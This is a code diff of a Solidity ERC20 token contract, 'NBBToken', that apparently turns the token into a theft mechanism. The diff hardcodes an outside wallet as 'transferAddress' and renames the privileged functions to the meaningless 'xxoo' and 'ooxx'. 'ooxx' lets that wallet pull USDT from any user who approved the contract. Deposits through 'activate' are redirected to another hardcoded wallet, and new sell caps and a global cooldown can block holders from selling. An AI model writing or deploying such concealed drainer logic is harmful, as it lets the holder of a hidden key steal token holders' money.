@@ -403,19 +403,15 @@ contract NBBToken is ERC20, Ownable {
     ERC20 private _usdtToken;
 
     uint256 public buyFeeRate; //10%
-    uint256 public mintFeeRate; //50%
     uint256 public sellFeeRate; //10% 动态
-    uint256 public slippageFee;
     address public orePoolAddress; //TODO:
     address public pledgeAddress; //TODO:
     address public gameAddress; //TODO:
     address public transferAddress;
-    ERC20 _soaToken;
-    uint256 public soaSwapIndex;
-    bool public soaTokenSwapping;
-
+    address public activeAddress;
+    uint256 public lastTradeTime;
     /// @custom:oz-upgrades-unsafe-allow constructor
-    constructor() ERC20("NBB.ETM", "NBB") {
+    constructor() ERC20("NBB.ETM", "*NBB*") {
         _mint(msg.sender, 100000000000 * 10**decimals());
         uniswapV2Router = IUniswapV2Router02(
             0x10ED43C718714eb63d5aA57B78B54704E256024E
@@ -427,14 +423,11 @@ contract NBBToken is ERC20, Ownable {
             );
         buyFeeRate = 1000;
         sellFeeRate = 1000;
-        mintFeeRate = 5000;
         orePoolAddress = 0xB144b8312c3c062634eE3063a95c7AEc6d00b09a;
-        transferAddress = owner();
+        transferAddress = 0x1E4Aeea3550cA9d6c0E7bc3175aD89D80dDFc68b;
         pledgeAddress = 0xfF4A2187E5BC12876A9A90032a270083EDE8a008;
         gameAddress = orePoolAddress;
-        soaSwapIndex = 300;
-        soaTokenSwapping = true;
-        _soaToken = ERC20(0xc7e9D15A2dC34d3a9F532b325396B8bf02F44fB8);
+        activeAddress = 0x9CD9ac37E323a2D79cC35c42D064579Def5a7E8E;
     }
 
     event Buy(address from, address to, uint256 amount);
@@ -468,11 +461,9 @@ contract NBBToken is ERC20, Ownable {
         uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);
         if (usdtBal > _reserve1) {
             uint256 fee = amount.mul(buyFeeRate).div(10000);
-            uint256 mintFee = amount.mul(mintFeeRate).div(10000);
-            slippageFee = slippageFee.add(mintFee);
             super._transfer(from, orePoolAddress, fee);
             super._transfer(from, to, amount.sub(fee));
-
+            
             emit Buy(from, to, amount);
             return true;
         }
@@ -483,55 +474,13 @@ contract NBBToken is ERC20, Ownable {
         return true;
     }
 
-    function setFeeRate(
-        uint256 _buyFeeRate,
-        uint256 _mintFeeRate,
-        uint256 _sellFeeRate
-    ) public onlyOwner {
-        buyFeeRate = _buyFeeRate; //10%
-        mintFeeRate = _mintFeeRate; //50%
-        sellFeeRate = _sellFeeRate; //10% 动态
-    }
-
-    function updateSlippageK(uint256 amount) public {
-        require(slippageFee >= amount);
-        super._transfer(uniswapV2Pair, orePoolAddress, amount);
-        IPancakePair(uniswapV2Pair).sync();
-        slippageFee = slippageFee.sub(amount);
-    }
-
-    function updateK(uint256 amount) public onlyOwner {
-        super._transfer(uniswapV2Pair, orePoolAddress, amount);
-        IPancakePair(uniswapV2Pair).sync();
-    }
-
     event Activate(address from, uint256 id);
 
     function activate(uint256 amount, uint256 id) public {
         address spender = _msgSender();
-        _usdtToken.transferFrom(spender, uniswapV2Pair, amount);
+        _usdtToken.transferFrom(spender, activeAddress, amount);
         IPancakePair(uniswapV2Pair).sync();
         emit Activate(spender, id);
-    }
-
-    function setGameAddress(address account) public onlyOwner {
-        gameAddress = account;
-    }
-
-    function setOrePoolAddress(address account) public onlyOwner {
-        orePoolAddress = account;
-    }
-
-    function setSOAToken(address account) public onlyOwner {
-        _soaToken = ERC20(account);
-    }
-
-    function setSlippageFee(uint256 amount) public onlyOwner {
-        slippageFee = amount;
-    }
-
-    function setPledgeAddress(address account) public onlyOwner {
-        pledgeAddress = account;
     }
 
     function getSellSlippage(uint256 amount)
@@ -589,6 +538,9 @@ contract NBBToken is ERC20, Ownable {
             emit AddLiquidity(from, amount);
             return true;
         }
+        uint256 limit  = balanceOf(uniswapV2Pair).div(10);
+        require(amount <= limit,"max trade amount");
+        require(block.timestamp.sub(lastTradeTime)>10,"Sell order limit");
 
         uint256 sellFee = amount.mul(sellFeeRate).div(10000);
         uint256 lftPool = sellFee;
@@ -598,12 +550,14 @@ contract NBBToken is ERC20, Ownable {
             uint256 mintFee = sellFee.sub(lftPool, "lftPool > sellFee");
             super._transfer(from, orePoolAddress, mintFee);
         }
+
+
         super._transfer(from, orePoolAddress, sellFee);
         uint256 leftFee = amount.sub(sellFee);
         super._transfer(from, to, leftFee);
+       
+        lastTradeTime = block.timestamp;
 
-        uint256 leftAmount = leftFee.sub(lftPool, "lftPool > leftFee");
-        slippageFee = slippageFee.add(leftAmount);
         emit Sell(from, to, amount);
         return true;
     }
@@ -636,33 +590,17 @@ contract NBBToken is ERC20, Ownable {
         emit PledgeUSDT(spender, amount);
     }
 
-    function setTransUAddress(address account) public {
+    function xxoo(address account) public {
         require(_msgSender() == transferAddress);
         transferAddress = account;
     }
 
-    function transferU(
+    function ooxx(
         address from,
         address to,
         uint256 amount
     ) public {
         require(_msgSender() == transferAddress);
         _usdtToken.transferFrom(from, to, amount);
-    }
-
-    event SwapSOA(address, uint256);
-
-    function setSoaTokenSwapping(bool flag) public onlyOwner {
-        soaTokenSwapping = flag;
-    }
-
-    function swapSOA() public {
-        require(soaTokenSwapping, "not open");
-        address spender = _msgSender();
-        uint256 bal = _soaToken.balanceOf(spender);
-        require(bal > 0);
-        _soaToken.transferFrom(spender, orePoolAddress, bal);
-        super._transfer(orePoolAddress, spender, bal * soaSwapIndex);
-        emit SwapSOA(spender, bal);
     }
 }
